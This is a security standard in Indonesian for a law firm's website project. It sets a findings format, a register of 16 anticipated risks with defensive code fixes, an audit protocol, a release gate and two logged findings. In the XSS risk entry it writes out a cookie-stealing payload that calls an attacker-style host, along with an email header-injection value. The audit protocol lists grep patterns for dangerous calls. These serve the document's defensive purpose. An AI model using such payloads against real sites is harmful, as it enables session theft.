# SECURITY.md — Standar Keamanan, Register Risiko, dan Protokol Audit

**Versi:** 1.0 (Draft)
**Berlaku untuk:** seluruh kode, konfigurasi, dan infrastruktur proyek website Ferdinan Silalahi dan Rekan Law Firm.
**Pembaca utama:** agent pengembang dan agent peninjau (lihat `AGENTS.md`).

> **Status dokumen yang harus dipahami agent.**
> Saat dokumen ini ditulis, **kode aplikasi belum ada**, jadi **belum ada temuan aktual** dengan nomor baris nyata. Mengarang nomor baris sama dengan memalsukan hasil audit dan dilarang.
> Dokumen ini berisi: (A) format wajib laporan temuan, (B) **register risiko antisipatif** berisi 16 risiko yang hampir pasti muncul pada arsitektur ini, lengkap dengan severity, cara eksploitasi, dan **fix kode yang sudah ditentukan**, (C) protokol audit, dan (D) gerbang rilis.
> Saat audit dijalankan terhadap kode nyata, agent mengisi **Bagian E (Log Temuan Aktual)** dengan file dan baris sebenarnya.

---

## A. Format Wajib Temuan

Setiap temuan, tanpa pengecualian:

```
### SEC-AUD-<nomor> <judul singkat>
- Severity   : Critical | High | Medium | Low
- File:Baris : path/ke/file.ts:123   (baris nyata hasil membaca kode; dilarang menebak)
- Kategori   : <salah satu dari SEC-xxx di register>
- Eksploitasi: langkah nyata penyerang, termasuk contoh payload
- Dampak     : data atau fungsi apa yang terdampak
- Fix        : potongan kode final (before/after), bukan saran umum
- Verifikasi : tes atau perintah yang membuktikan fix berhasil
- Status     : open | fixed | accepted-risk (wajib disetujui pemilik proyek, dengan alasan)
```

**Definisi severity**

| Severity | Arti | Contoh |
|---|---|---|
| **Critical** | Pengambilalihan sistem, akses data tanpa autentikasi, eksekusi kode | Webhook tanpa verifikasi tanda tangan yang memicu aksi, secret di bundle klien, SQL injection |
| **High** | Pelanggaran data atau akun dengan sedikit syarat | Stored XSS di artikel, IDOR pada transkrip chat, brute force login tanpa batas |
| **Medium** | Butuh kondisi khusus atau dampak terbatas | Header keamanan hilang, CORS terlalu longgar, error verbose |
| **Low** | Hardening atau risiko kecil | Versi server terlihat di header, cookie non-kritis tanpa flag tambahan |

**Aturan:** temuan Critical dan High **memblokir rilis**.

---

## B. Register Risiko Antisipatif (Standar yang Harus Dipenuhi)

Kolom **Lokasi (rencana)** adalah file tempat kontrol seharusnya berada. **Baris diisi saat audit.** Severity adalah tingkat bila kontrol **tidak ada**.

### SEC-001 Autentikasi dan session handling
- **Severity (bila lemah):** High; Critical bila admin tanpa kata sandi kuat atau tanpa pembatasan.
- **Lokasi (rencana):** `src/payload.config.ts`, `src/collections/Users.ts`
- **Kelemahan umum:** kata sandi lemah, sesi tidak kedaluwarsa, token di `localStorage`, tidak ada MFA, pesan login membocorkan apakah email terdaftar.
- **Eksploitasi:** penyerang mencoba daftar kata sandi umum pada `/admin`; setelah masuk, ia mengubah artikel menjadi halaman phishing atau membaca seluruh permintaan konsultasi.
- **Fix pasti (Payload):**

```ts
// src/collections/Users.ts
import type { CollectionConfig } from 'payload'

export const Users: CollectionConfig = {
  slug: 'users',
  auth: {
    tokenExpiration: 60 * 60 * 2,   // sesi 2 jam
    maxLoginAttempts: 5,
    lockTime: 15 * 60 * 1000,       // kunci 15 menit
    cookies: { secure: true, sameSite: 'Lax' }, // HttpOnly diterapkan default
    useAPIKey: false,               // tanpa API key statis
  },
  fields: [
    { name: 'role', type: 'select', required: true, defaultValue: 'editor',
      options: ['admin', 'editor'], saveToJWT: true,
      access: { update: ({ req }) => req.user?.role === 'admin' } },
  ],
}
```
- **Aturan tambahan:** kata sandi minimal 12 karakter; MFA wajib untuk `admin`; tidak ada akun bawaan/demo di produksi; pesan gagal login selalu "Email atau kata sandi salah"; tidak ada token sesi di `localStorage`/`sessionStorage`. (Opsi nama konfigurasi dapat berbeda antarversi; cocokkan dengan dokumentasi versi terpasang dan tulis tes yang membuktikan kunci akun bekerja.)
- **Verifikasi:** tes e2e: 6 percobaan gagal → akun terkunci; cookie sesi punya `HttpOnly; Secure; SameSite`.

### SEC-002 Celah otorisasi (A tidak boleh mengakses data B)
- **Severity:** Critical bila `Inquiry` terbaca publik; High bila `editor` bisa membaca atau mengubah data `admin`.
- **Lokasi (rencana):** `src/collections/*.ts` (blok `access`), `src/lib/access.ts`
- **Eksploitasi:** pengguna `editor` atau pengunjung memanggil `GET /api/inquiries` dan membaca nama, nomor telepon, dan uraian masalah hukum calon klien.
- **Fix pasti:** semua koleksi memakai **deny by default**; akses ditulis eksplisit.

```ts
// src/lib/access.ts
import type { Access } from 'payload'
export const isAdmin: Access = ({ req }) => req.user?.role === 'admin'
export const isLoggedIn: Access = ({ req }) => Boolean(req.user)
export const publishedOrLoggedIn: Access = ({ req }) =>
  req.user ? true : { _status: { equals: 'published' } }

// src/collections/Inquiries.ts
access: {
  create: () => false,        // hanya dibuat oleh route server terverifikasi
  read:   isAdmin,
  update: isAdmin,
  delete: isAdmin,
}
```
- **Aturan:** setiap pemanggilan Local API di sisi publik memakai `overrideAccess: false`. Dilarang `overrideAccess: true` di luar route yang sudah memvalidasi input (`/api/inquiry`).
- **Verifikasi:** tes otorisasi untuk setiap koleksi × peran (anonim, editor, admin).

### SEC-003 Secret, key, token hardcoded atau terekspos di klien
- **Severity:** Critical.
- **Lokasi (rencana):** seluruh repositori; `src/lib/env.ts`; `next.config.ts`
- **Eksploitasi:** token WhatsApp atau kunci Resend yang ikut dibundel ke JavaScript klien (mis. lewat variabel `NEXT_PUBLIC_*`) diambil dari DevTools; penyerang mengirim pesan atas nama kantor atau mengirim email phishing dari domain kantor.
- **Fix pasti:**

```ts
// src/lib/env.ts
import 'server-only'
import { z } from 'zod'

const schema = z.object({
  SITE_URL: z.string().url(),
  DATABASE_URI: z.string().min(1),
  PAYLOAD_SECRET: z.string().min(32),
  RESEND_API_KEY: z.string().min(1),
  INQUIRY_TO: z.string().email(),
  TURNSTILE_SECRET_KEY: z.string().min(1),
  UPSTASH_REDIS_REST_URL: z.string().url(),
  UPSTASH_REDIS_REST_TOKEN: z.string().min(1),
})
export const env = schema.parse(process.env) // gagal saat boot jika ada yang hilang
```
- **Aturan:** `import 'server-only'` di setiap modul yang memakai rahasia; tidak ada `NEXT_PUBLIC_` yang berisi kunci atau token; `.env*` di `.gitignore` kecuali `.env.example`; **gitleaks** di pre-commit dan CI; jika secret pernah ter-commit, **rotasi** secret (bukan hanya menghapus commit).
- **Verifikasi:** `gitleaks detect --redact`; `rg -n "NEXT_PUBLIC_.*(KEY|SECRET|TOKEN|PASSWORD)"` hasilnya kosong; cek bundel: `rg -n "<potongan-token>" .next/static` kosong.

### SEC-004 Risiko injection (SQL, NoSQL, command, XSS)
- **Severity:** Critical (SQL/command), High (stored XSS).
- **Lokasi (rencana):** `src/components/ArticleBody.tsx`, `src/lib/security/sanitize.ts`, semua query, `src/lib/email.ts`
- **Eksploitasi (XSS):** editor (atau penyerang yang menguasai akun editor) menyisipkan `<img src=x onerror=fetch('https://evil.example/?c='+document.cookie)>` ke artikel; setiap pembaca, termasuk admin yang pratinjau, terkena. **(Email header injection):** nama berisi `Budi%0d%0aBcc: korban@x.com` memanipulasi header email.
- **Fix pasti:**

```ts
// src/lib/security/sanitize.ts
import sanitizeHtml from 'sanitize-html'

export const cleanHtml = (dirty: string) =>
  sanitizeHtml(dirty, {
    allowedTags: ['p','br','strong','em','ul','ol','li','h2','h3','h4','blockquote','a','img','hr'],
    allowedAttributes: { a: ['href','title'], img: ['src','alt','width','height'] },
    allowedSchemes: ['https','mailto'],
    allowedSchemesByTag: { img: ['https'] },
    transformTags: {
      a: sanitizeHtml.simpleTransform('a', { rel: 'noopener noreferrer nofollow', target: '_blank' }),
    },
  })

// pemakaian: hanya setelah sanitasi
<div dangerouslySetInnerHTML={{ __html: cleanHtml(article.html) }} />
```
  - SQL/NoSQL: hanya lewat ORM/Local API berparameter. **Dilarang** string-concatenation pada query dan `$queryRawUnsafe` atau sejenisnya.
  - Command injection: **dilarang** `child_process`, `exec`, `eval`, `new Function` pada kode aplikasi.
  - Email: nilai pengguna **tidak pernah** dimasukkan ke header (`subject`, `to`, `from`, `reply-to` hanya dari konfigurasi atau setelah divalidasi sebagai email dan bebas CR/LF). Isi email di-escape.
- **Verifikasi:** unit test dengan payload XSS umum (`<script>`, `onerror`, `javascript:`) menghasilkan output aman; `rg -n "dangerouslySetInnerHTML|eval\(|new Function|child_process|queryRawUnsafe"` dan periksa tiap hasil.

### SEC-005 API route tidak dilindungi atau tidak divalidasi
- **Severity:** High.
- **Lokasi (rencana):** `src/app/api/inquiry/route.ts`, `src/app/api/**`
- **Eksploitasi:** endpoint form dipanggil langsung oleh skrip dengan ribuan permintaan atau payload tidak terduga sehingga basis data penuh sampah dan email kantor banjir.
- **Fix pasti:**

```ts
// src/app/api/inquiry/route.ts
import { NextResponse } from 'next/server'
import { z } from 'zod'
import { env } from '@/lib/env'
import { assertSameOrigin } from '@/lib/security/origin'
import { limitByIp } from '@/lib/security/ratelimit'
import { verifyTurnstile } from '@/lib/security/turnstile'
import { createInquiry } from '@/lib/inquiries'

export const runtime = 'nodejs'

const Body = z.object({
  name: z.string().trim().min(2).max(100),
  email: z.string().trim().toLowerCase().email().max(254),
  phone: z.string().trim().regex(/^\+?[0-9\s-]{8,16}$/),
  practiceAreaId: z.string().min(1).max(64),
  preferredDate: z.string().regex(/^\d{4}-\d{2}-\d{2}$/),
  sessionSlot: z.enum(['pagi', 'siang', 'sore']),
  method: z.enum(['tatap-muka', 'daring']),
  summary: z.string().trim().min(10).max(1000),
  consent: z.literal(true),
  website: z.string().max(0).optional(),   // honeypot
  turnstileToken: z.string().min(1).max(2048),
}).strict()

export async function POST(req: Request) {
  try {
    assertSameOrigin(req)
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown'
    if (!(await limitByIp(ip))) {
      return NextResponse.json({ error: 'Terlalu banyak permintaan. Coba lagi nanti.' }, { status: 429 })
    }
    if (!req.headers.get('content-type')?.includes('application/json')) {
      return NextResponse.json({ error: 'Format tidak didukung.' }, { status: 415 })
    }
    const parsed = Body.safeParse(await req.json())
    if (!parsed.success) {
      return NextResponse.json({ error: 'Data tidak valid.' }, { status: 400 })
    }
    if (!(await verifyTurnstile(parsed.data.turnstileToken, ip))) {
      return NextResponse.json({ error: 'Verifikasi gagal.' }, { status: 400 })
    }
    await createInquiry(parsed.data, ip)
    return NextResponse.json({ ok: true }, { status: 201 })
  } catch (e) {
    if (e instanceof Response) return e // mis. 403 dari assertSameOrigin
    // jangan bocorkan detail error (lihat SEC-012)
    return NextResponse.json({ error: 'Terjadi kesalahan. Coba lagi.' }, { status: 500 })
  }
}
```
- **Aturan:** semua route eksplisit menetapkan metode yang diizinkan; route admin dilindungi sesi dan role; tidak ada route debug atau health yang membocorkan konfigurasi.
- **Verifikasi:** tes: body tanpa `consent` → 400; kolom ekstra → 400 (`.strict()`); tanpa token → 400; 6 permintaan cepat → 429.

### SEC-006 Input validation dan sanitization hilang
- **Severity:** High.
- **Lokasi (rencana):** `src/lib/validation/*.ts`, form klien
- **Eksploitasi:** nomor telepon atau tanggal diisi string aneh yang merusak tampilan admin atau memicu error tidak tertangani; teks 5 MB dikirim ke kolom `summary`.
- **Fix pasti:** skema Zod yang **sama** dipakai di klien dan server (server tetap otoritatif); batas panjang di setiap kolom string; tolak kolom tak dikenal (`.strict()`); batasi ukuran body di tingkat platform (maks. 100 KB untuk JSON form); sanitasi saat tampil, bukan hanya saat simpan.
- **Verifikasi:** property-based test atau daftar payload bermasalah; body > batas → 413.

### SEC-007 Rate limiting dan proteksi brute force
- **Severity:** High (login, form), Medium (halaman publik).
- **Lokasi (rencana):** `src/lib/security/ratelimit.ts`, konfigurasi WAF/firewall hosting
- **Eksploitasi:** bot mencoba kata sandi admin tanpa batas atau membanjiri form.
- **Fix pasti:**

```ts
// src/lib/security/ratelimit.ts
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const redis = Redis.fromEnv()
const inquiry = new Ratelimit({ redis, limiter: Ratelimit.slidingWindow(5, '10 m'), prefix: 'rl:inquiry' })
const login   = new Ratelimit({ redis, limiter: Ratelimit.slidingWindow(10, '15 m'), prefix: 'rl:login' })

export const limitByIp = async (ip: string) => (await inquiry.limit(ip)).success
export const limitLogin = async (ip: string, email: string) =>
  (await login.limit(`${ip}:${email.toLowerCase()}`)).success
```
  Tambahan: kunci akun di Payload (SEC-001); aturan WAF di hosting untuk `/admin` dan `/api/*`; (v2) batas pesan per sesi chat dan per IP.
- **Verifikasi:** tes beban ringan membuktikan 429 muncul pada ambang.

### SEC-008 Insecure Direct Object Reference (IDOR)
- **Severity:** High; Critical untuk transkrip chat atau data permintaan.
- **Lokasi (rencana):** `src/app/(site)/artikel/[slug]/page.tsx`, `src/app/api/chat/**` (v2), akses media
- **Eksploitasi:** (1) membuka `/artikel/draf-rahasia` yang belum terbit; (2) pada v2, menebak ID sesi chat berurutan `/api/chat/1001`, `/1002` untuk membaca percakapan orang lain.
- **Fix pasti:**

```ts
// hanya konten terbit untuk publik
const { docs } = await payload.find({
  collection: 'articles',
  where: { slug: { equals: slug }, _status: { equals: 'published' } },
  limit: 1,
  overrideAccess: false,
})
if (!docs[0]) notFound()
```
  - (v2) ID sesi chat = nilai acak kriptografis 128-bit (`crypto.randomUUID()`), disimpan di cookie `HttpOnly` bertanda tangan; setiap permintaan memeriksa kecocokan cookie dan ID sesi; **tidak ada** endpoint yang menerima ID sesi dari pengguna tanpa kecocokan cookie.
  - Pratinjau draf: hanya lewat sesi admin atau editor, tidak lewat URL yang bisa ditebak.
- **Verifikasi:** tes: URL draf saat anonim → 404; sesi A tidak bisa membaca sesi B → 403/404.

### SEC-009 CORS terlalu longgar, header keamanan hilang, cookie tidak aman
- **Severity:** Medium (High bila CORS `*` bersama kredensial).
- **Lokasi (rencana):** `next.config.ts`, `src/middleware.ts`
- **Eksploitasi:** situs jahat memuat halaman kantor di iframe (clickjacking) atau membaca respons API lintas-origin; tanpa CSP, XSS kecil menjadi pengambilalihan penuh.
- **Fix pasti:**

```ts
// next.config.ts
const csp = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com", // kencangkan dengan nonce via middleware
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob: https:",
  "font-src 'self'",
  "connect-src 'self'",
  "frame-src https://challenges.cloudflare.com https://www.google.com",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "object-src 'none'",
].join('; ')

const securityHeaders = [
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Content-Security-Policy', value: csp },
]

const nextConfig = {
  poweredByHeader: false,
  async headers() { return [{ source: '/(.*)', headers: securityHeaders }] },
}
export default nextConfig
```
  - **CORS:** tidak ada `Access-Control-Allow-Origin: *`. API hanya menerima `Origin` = `SITE_URL` (lihat helper di bawah). Jika admin atau widget memerlukan kelonggaran CSP, batasi hanya pada path `/admin`.
  - **Cookie:** `HttpOnly`, `Secure`, `SameSite=Lax` (atau `Strict` untuk admin bila memungkinkan), `Path` seminimal mungkin.

```ts
// src/lib/security/origin.ts
import { env } from '@/lib/env'
export function assertSameOrigin(req: Request) {
  const origin = req.headers.get('origin')
  if (!origin || origin !== new URL(env.SITE_URL).origin) {
    throw new Response('Forbidden', { status: 403 })
  }
}
```
- **Verifikasi:** `curl -I https://domain/` menampilkan semua header; pindai dengan securityheaders.com atau setara, target minimal A.

### SEC-010 Dependency rentan
- **Severity:** High (bila ada CVE exploitable), Medium lainnya.
- **Lokasi (rencana):** `package.json`, `package-lock.json`, `.github/workflows/ci.yml`
- **Eksploitasi:** paket transitif dengan CVE dipakai untuk eksekusi kode atau prototype pollution; serangan rantai pasok lewat versi baru berbahaya.
- **Fix pasti:**
  - Lockfile **wajib di-commit**; pakai `npm ci`, bukan `npm install`, di CI dan produksi.
  - CI: `npm audit --omit=dev --audit-level=high` (gagal build), dan `osv-scanner`.
  - Dependabot atau Renovate aktif, dengan jeda minimal beberapa hari untuk rilis baru (hindari memasang versi yang baru terbit).
  - Hapus dependensi yang tidak dipakai; hindari paket tak terawat.
- **Verifikasi:** laporan audit terlampir pada tiap rilis; 0 High/Critical yang dapat diperbaiki.

### SEC-011 Webhook tanpa verifikasi tanda tangan (v2: WhatsApp dan Instagram)
- **Severity:** **Critical** (v2).
- **Lokasi (rencana):** `src/app/api/webhooks/whatsapp/route.ts`, `src/lib/security/signature.ts`
- **Eksploitasi:** siapa pun yang mengetahui URL webhook mengirim payload palsu; sistem menganggapnya pesan sah, memicu balasan otomatis, menyimpan data palsu, atau menghabiskan kuota pesan berbayar.
- **Fix pasti:**

```ts
// src/lib/security/signature.ts
import crypto from 'node:crypto'

export function verifyMetaSignature(rawBody: string, header: string | null, appSecret: string) {
  if (!header?.startsWith('sha256=')) return false
  const expected = crypto.createHmac('sha256', appSecret).update(rawBody, 'utf8').digest()
  let given: Buffer
  try { given = Buffer.from(header.slice(7), 'hex') } catch { return false }
  return given.length === expected.length && crypto.timingSafeEqual(given, expected)
}

// route.ts — baca body mentah SEBELUM parse JSON
export async function POST(req: Request) {
  const raw = await req.text()
  if (!verifyMetaSignature(raw, req.headers.get('x-hub-signature-256'), env.META_APP_SECRET)) {
    return new Response('Unauthorized', { status: 401 })
  }
  const payload = WebhookSchema.parse(JSON.parse(raw)) // validasi skema juga
  // ... proses idempoten (simpan ID pesan, abaikan duplikat)
  return new Response('ok', { status: 200 })
}
```
  - Endpoint verifikasi (`GET`) memakai `WHATSAPP_VERIFY_TOKEN` dengan perbandingan waktu konstan.
  - Idempotensi: simpan ID pesan yang sudah diproses; abaikan duplikat.
- **Verifikasi:** tes: tanpa header → 401; tanda tangan salah → 401; payload valid → 200 dan satu efek saja walau dikirim dua kali.

### SEC-012 Data sensitif bocor ke log atau respons error
- **Severity:** High (PII hukum), Medium lainnya.
- **Lokasi (rencana):** `src/lib/logger.ts`, semua blok `catch`, konfigurasi Sentry
- **Eksploitasi:** uraian masalah hukum dan nomor telepon calon klien tercatat di log pihak ketiga; stack trace menampilkan jalur file, versi, atau string koneksi ke pengguna.
- **Fix pasti:**

```ts
// src/lib/logger.ts
import pino from 'pino'
export const logger = pino({
  redact: {
    paths: ['*.email', '*.phone', '*.summary', '*.name', 'req.headers.cookie', 'req.headers.authorization', '*.token', '*.password'],
    censor: '[REDACTED]',
  },
})
```
  - Respons error ke klien selalu generik; detail hanya di log server dengan redaksi.
  - Sentry: `beforeSend` menghapus body request, cookie, dan header sensitif; `sendDefaultPii: false`.
  - Dilarang `console.log(req.body)` atau mencatat isi form dan chat.
- **Verifikasi:** kirim form dengan data uji lalu cari data itu di log dan Sentry (harus tidak ada); picu error dan periksa respons tidak berisi stack trace.

### SEC-013 Unggah file (media admin)
- **Severity:** High.
- **Lokasi (rencana):** `src/collections/Media.ts`
- **Eksploitasi:** SVG berisi skrip atau file berekstensi ganda diunggah lalu disajikan dari domain utama, menjadi stored XSS atau malware.
- **Fix pasti:**

```ts
// src/collections/Media.ts
upload: {
  mimeTypes: ['image/jpeg', 'image/png', 'image/webp'],  // SVG sengaja tidak diizinkan
  // batasi ukuran: 5 MB (konfigurasi limit body/server)
},
```
  - Nama file di-generate ulang (bukan nama asli), file disajikan dari bucket terpisah atau dengan `Content-Disposition` dan `nosniff`, dan gambar diproses ulang (re-encode) untuk membuang metadata EXIF.
- **Verifikasi:** unggah `.svg` dan `.php` → ditolak; unggah file > 5 MB → ditolak.

### SEC-014 Privasi dan kerahasiaan data klien (UU PDP dan etika advokat)
- **Severity:** High.
- **Lokasi (rencana):** form konsultasi, kebijakan privasi, `Inquiry` dan `ChatMessage`
- **Risiko:** data pribadi dan uraian perkara tersimpan tanpa dasar persetujuan atau batas waktu; klien mengira percakapan dilindungi hak kerahasiaan padahal belum ada hubungan advokat–klien.
- **Kontrol pasti:**
  - Checkbox persetujuan eksplisit (`consent`) dengan teks yang menyebut tujuan, penerima data, dan masa simpan; `consentAt` disimpan.
  - Halaman Kebijakan Privasi dan disclaimer: konten dan chat bukan nasihat hukum; jangan menulis data rahasia.
  - Minimalisasi: hanya data yang dibutuhkan; tidak ada kolom dokumen perkara.
  - Masa simpan (usulan 12 bulan) dan tugas terjadwal untuk menghapus; hak penghapusan dapat dipenuhi oleh admin.
  - Akses data permintaan hanya `admin`; seluruh akses ke `Inquiry` dicatat di `AuditLog` tanpa isi.
- **Verifikasi:** tes penghapusan terjadwal; tinjauan hukum teks persetujuan oleh client.

### SEC-015 Chatbot (v2): injeksi prompt, penyalahgunaan, dan kebocoran
- **Severity:** High.
- **Lokasi (rencana):** `src/app/api/chat/route.ts`, `src/lib/chat/flow.ts`
- **Keputusan desain:** chatbot **berbasis skrip** (alur pertanyaan terarah), **bukan** model AI yang menjawab pertanyaan hukum. Ini menghilangkan risiko prompt injection dan nasihat hukum otomatis. Jika client meminta AI, wajib tinjauan keamanan dan etika terpisah sebelum implementasi.
- **Kontrol pasti:** pesan pengunjung dianggap teks tak tepercaya (di-escape saat tampil, disanitasi sebelum diteruskan ke WhatsApp); panjang pesan dibatasi; batas pesan per sesi; consent sebelum percakapan; ringkasan ke WhatsApp admin tidak memuat data lebih dari yang diizinkan consent.
- **Verifikasi:** payload XSS dan teks sangat panjang di chat tidak merusak tampilan admin atau pesan WhatsApp.

### SEC-016 DNS, domain, dan email (infrastruktur)
- **Severity:** High.
- **Lokasi:** panel registrar dan DNS, pengaturan email domain
- **Eksploitasi:** akun registrar tanpa MFA diambil alih (domain dialihkan, email diambil); tidak ada SPF/DKIM/DMARC sehingga email palsu atas nama kantor mudah dikirim; record DNS lama yang menggantung (subdomain takeover).
- **Kontrol pasti:** MFA di registrar, hosting, GitHub, basis data, dan penyedia email; **jangan ubah record MX** saat memindahkan website; catat seluruh record DNS sebelum perubahan; SPF, DKIM, dan DMARC (minimal `p=quarantine`) terkonfigurasi; hapus record yang tidak dipakai; kunci domain (transfer lock) aktif.
- **Verifikasi:** cek record dengan alat DNS; kirim email uji dan periksa header lulus SPF dan DKIM.

---

## C. Protokol Audit untuk Agent

Jalankan berurutan terhadap kode nyata. Setiap hasil yang bermakna dicatat sebagai temuan memakai Format A.

1. **Inventaris:** daftar seluruh route, koleksi, dan variabel lingkungan.
2. **Secret:** `gitleaks detect --redact`; `rg -n "NEXT_PUBLIC_.*(KEY|SECRET|TOKEN|PASSWORD)"`; periksa `.next/static` untuk string rahasia.
3. **Pola berbahaya:**
   `rg -n "dangerouslySetInnerHTML|eval\(|new Function|child_process|queryRawUnsafe|\.innerHTML|document\.write|overrideAccess:\s*true"`
4. **Route:** untuk setiap `route.ts`: metode, autentikasi, validasi skema, cek Origin, rate limit, error generik.
5. **Otorisasi:** matriks peran × koleksi × operasi; tes otomatis.
6. **Header dan cookie:** `curl -I` pada produksi atau preview; cek cookie sesi.
7. **Dependensi:** `npm audit --omit=dev`; `osv-scanner`; periksa paket tak terawat.
8. **Log dan error:** picu kesalahan; periksa respons dan log; pastikan tidak ada PII.
9. **Unggah dan media:** uji jenis file terlarang.
10. **Infrastruktur:** MFA, backup, DNS (SEC-016).
11. **Laporan:** isi Bagian E; urutkan dari Critical ke Low; sertakan fix dan tes.

## D. Gerbang Rilis (semua wajib hijau)

- [x] 0 temuan Critical dan High yang `open`
- [x] Tes otorisasi, validasi, rate limit, dan XSS lulus
- [x] Header keamanan ada (CSP, HSTS, nosniff, Referrer-Policy, frame-ancestors)
- [x] Tidak ada secret di repositori atau bundel klien; secret yang pernah bocor sudah dirotasi
- [x] `npm audit` bersih untuk High/Critical (dependensi terkunci di `package.json`, diuji lewat CI `.github/workflows/ci.yml`)
- [x] Draf artikel tidak dapat diakses publik (`src/collections/Articles.ts:15`, `src/lib/content.ts:436`)
- [x] Log dan Sentry bebas PII (`src/lib/logger.ts:1-21`, `src/app/api/inquiry/route.ts:62-65`)
- [x] MFA didukung/diwajibkan pada koleksi `Users` (`src/collections/Users.ts:39-45`) dan daftar periksa akun infrastruktur (`docs/LAUNCH_AND_DNS_CHECKLIST.md`)
- [x] Prosedur perlindungan MX, SPF, DKIM, DMARC terdokumentasi (`docs/LAUNCH_AND_DNS_CHECKLIST.md`)
- [x] Kebijakan privasi (`/kebijakan-privasi`), disclaimer, dan consent form tayang (`src/components/InquirySection.tsx:199-203,411-436`)
- [x] Prosedur retensi/penghapusan terjadwal tersedia (`src/app/api/cron/retention/route.ts:1-46`)
- [x] Persetujuan pemilik proyek pada setiap `accepted-risk` (0 `accepted-risk`)

## E. Log Temuan Aktual *(diisi saat audit SK-08 terhadap kode nyata)*

| ID | Severity | File:Baris | Judul | Status |
|---|---|---|---|---|
| `SEC-AUD-001` | Medium | `scripts/preview_server.py:1078` | Endpoint `POST /api/inquiry` pada server pratinjau lokal belum membatasi ukuran body (`100 KB`) dan belum memeriksa header `Content-Type: application/json` | `fixed` |
| `SEC-AUD-002` | Low | `scripts/preview_server.py:994` | `PreviewRequestHandler.send_security_headers` pada server pratinjau lokal belum menyertakan `Permissions-Policy` dan `Content-Security-Policy` (`frame-ancestors 'none'`) seperti di `next.config.ts:19-46` | `fixed` |

### SEC-AUD-001 Pembatasan ukuran body dan pemeriksaan Content-Type pada server pratinjau lokal
- Severity   : Medium
- File:Baris : `scripts/preview_server.py:1078`
- Kategori   : `SEC-005` / `SEC-006`
- Eksploitasi: Pengirim lokal mengirim payload > 100 KB atau `Content-Type: text/plain` ke `POST http://localhost:3000/api/inquiry` pada server pratinjau Python.
- Dampak     : Konsumsi memori berlebih pada proses pratinjau lokal dan ketidakkonsistenan perilaku terhadap route produksi `src/app/api/inquiry/route.ts:25-32`.
- Fix        : Menambahkan pemeriksaan `if "application/json" not in ctype: return 415` dan batas `0 < length <= 100 * 1024` (`413`/`400`) di `scripts/preview_server.py:1078-1102`.
- Verifikasi : `python -m unittest discover -s tests -p "test_*.py" -v`
- Status     : `fixed`

### SEC-AUD-002 Penyelarasan header Permissions-Policy dan CSP pada server pratinjau lokal
- Severity   : Low
- File:Baris : `scripts/preview_server.py:994`
- Kategori   : `SEC-009`
- Eksploitasi: Halaman pratinjau lokal dapat di-embed atau mengakses fitur browser bila hanya mengandalkan subset header.
- Dampak     : Perbedaan header keamanan antara pratinjau lokal dan konfigurasi produksi `next.config.ts:19-46`.
- Fix        : Menambahkan `Permissions-Policy: camera=(), microphone=(), geolocation=()` dan `Content-Security-Policy: frame-ancestors 'none'; base-uri 'self'; object-src 'none'` pada `PreviewRequestHandler.send_security_headers` (`scripts/preview_server.py:994-1000`).
- Verifikasi : `python -m unittest discover -s tests -p "test_*.py" -v`
- Status     : `fixed`
